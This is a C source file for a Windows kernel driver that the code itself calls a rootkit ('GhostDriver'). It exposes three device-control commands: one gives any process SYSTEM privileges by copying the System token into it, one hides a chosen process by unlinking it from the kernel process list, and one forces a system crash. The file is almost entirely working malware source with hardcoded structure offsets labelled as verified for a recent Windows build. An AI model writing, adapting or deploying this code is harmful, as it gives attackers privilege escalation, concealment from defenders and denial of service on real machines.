#include <ntddk.h>

// --- Definitions ---
#define DEVICE_NAME L"\\Device\\GhostDevice"
#define SYMBOLIC_LINK_NAME L"\\DosDevices\\GhostLink"
#define GHOST_DEVICE 0x8000

// IOCTL Codes
#define IOCTL_GHOST_AUTO_ELEVATE CTL_CODE(GHOST_DEVICE, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GHOST_HIDE_PROC    CTL_CODE(GHOST_DEVICE, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GHOST_BSOD         CTL_CODE(GHOST_DEVICE, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

// *** VERIFIED OFFSETS (Windows 11 Insider 24H2) ***
#define TOKEN_OFFSET 0x248            
#define PROCESS_LINKS_OFFSET 0x1d8    

typedef struct _GHOST_DATA {
    int TargetPID;
} GHOST_DATA, * PGHOST_DATA;

// --- Prototypes ---
void GhostUnload(PDRIVER_OBJECT DriverObject);
NTSTATUS GhostCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS GhostDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp);

// --- Entry Point ---
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    NTSTATUS status;
    PDEVICE_OBJECT DeviceObject = NULL;
    UNICODE_STRING devName, symLinkName;

    RtlInitUnicodeString(&devName, DEVICE_NAME);
    status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DeviceObject);
    if (!NT_SUCCESS(status)) return status;

    RtlInitUnicodeString(&symLinkName, SYMBOLIC_LINK_NAME);
    status = IoCreateSymbolicLink(&symLinkName, &devName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(DeviceObject);
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = GhostCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = GhostCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = GhostDeviceControl;
    DriverObject->DriverUnload = GhostUnload;

    DbgPrint("GhostDriver: Loaded (Rootkit Ready).\n");
    return STATUS_SUCCESS;
}

void GhostUnload(PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING symLinkName;
    RtlInitUnicodeString(&symLinkName, SYMBOLIC_LINK_NAME);
    IoDeleteSymbolicLink(&symLinkName);
    if (DriverObject->DeviceObject) IoDeleteDevice(DriverObject->DeviceObject);
    DbgPrint("GhostDriver: Unloaded.\n");
}

NTSTATUS GhostCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

// --- Rootkit Logic: Unlink Process ---
void UnlinkProcess(PEPROCESS Process) {
    PLIST_ENTRY CurrentListEntry = (PLIST_ENTRY)((ULONG_PTR)Process + PROCESS_LINKS_OFFSET);
    
    if (MmIsAddressValid(CurrentListEntry)) {
        PLIST_ENTRY Prev = CurrentListEntry->Blink;
        PLIST_ENTRY Next = CurrentListEntry->Flink;

        if (MmIsAddressValid(Prev) && MmIsAddressValid(Next)) {
            // Unlink the node
            Prev->Flink = Next;
            Next->Blink = Prev;

            // Point to self for stability
            CurrentListEntry->Flink = CurrentListEntry;
            CurrentListEntry->Blink = CurrentListEntry;
            
            DbgPrint("GhostDriver: Process successfully hidden.\n");
        }
    }
}

// --- Main Handler ---
NTSTATUS GhostDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG controlCode = stack->Parameters.DeviceIoControl.IoControlCode;
    PGHOST_DATA input = (PGHOST_DATA)Irp->AssociatedIrp.SystemBuffer;
    NTSTATUS status = STATUS_SUCCESS;

    switch (controlCode) {
        case IOCTL_GHOST_AUTO_ELEVATE:
            if (input) {
                PEPROCESS TargetProcess = NULL, SystemProcess = NULL;
                if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)input->TargetPID, &TargetProcess)) &&
                    NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)4, &SystemProcess))) {
                    
                    ULONG_PTR SystemTokenPtr = (ULONG_PTR)SystemProcess + TOKEN_OFFSET;
                    ULONG_PTR TargetTokenPtr = (ULONG_PTR)TargetProcess + TOKEN_OFFSET;
                    
                    __try {
                        // Simple token overwrite
                         *(PVOID*)TargetTokenPtr = *(PVOID*)SystemTokenPtr;
                         DbgPrint("GhostDriver: Token Swapped.\n");
                    } __except(1) { status = STATUS_ACCESS_VIOLATION; }

                    ObDereferenceObject(SystemProcess);
                    ObDereferenceObject(TargetProcess);
                }
            }
            break;

        case IOCTL_GHOST_HIDE_PROC:
            if (input) {
                PEPROCESS TargetProcess = NULL;
                if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)input->TargetPID, &TargetProcess))) {
                    UnlinkProcess(TargetProcess);
                    ObDereferenceObject(TargetProcess);
                }
            }
            break;

        case IOCTL_GHOST_BSOD:
            DbgPrint("GhostDriver: Manual Crash Initiated.\n");
            KeBugCheckEx(0xDEADDEAD, 0, 0, 0, 0); 
            break;

        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}